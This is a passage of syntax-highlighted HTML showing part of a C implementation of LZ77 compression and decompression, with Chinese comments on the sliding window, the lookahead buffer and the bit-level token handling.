class=\"crayon-h\">        </span><span class=\"crayon-c\">/*将标记写入压缩缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-128\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">tbits</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-129\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-130\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-131\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-132\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*为压缩缓冲区分配临时空间*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-133\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-134\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-135\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-136\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-137\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-138\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">comp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-139\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-140\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-141\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-142\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">token</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-143\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-144\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-145\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*调整短语长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-146\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-147\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-148\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*从前向缓冲区中拷贝数据到滑动窗口中*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-149\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-150\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-151\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-152\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*向前向缓冲区中读取更多数据*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-153\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-154\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-155\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-156\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-157\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-158\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-159\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*调整剩余未匹配的长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-160\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-161\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-162\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*指向压缩数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-163\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-164\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*返回压缩数据中的字节数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-165\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-166\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-167\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-168\"><span class=\"crayon-c\">/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-169\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lz77_uncompress</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-170\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-171\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-172\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-173\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-174\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-175\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-176\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">           </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-177\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-178\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-179\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-180\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-181\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-182\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-183\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-184\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">state</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-185\"><span class=\"crayon-h\">                  </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-186\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*使指向原始数据的指针暂时无效*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-187\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-188\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-189\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*获取头部信息*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-190\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-191\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-192\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-193\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化滑动窗口和前向缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-194\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-195\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-196\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-197\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*解压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-198\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">hsize *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-199\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-200\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-201\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-202\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-203\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-204\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*获取压缩数据中的下一位*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-205\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-206\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-207\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-208\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-209\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-210\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*处理的是短语标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-211\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-212\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-213\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-214\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-215\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-216\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-217\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-218\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-219\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-220\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span 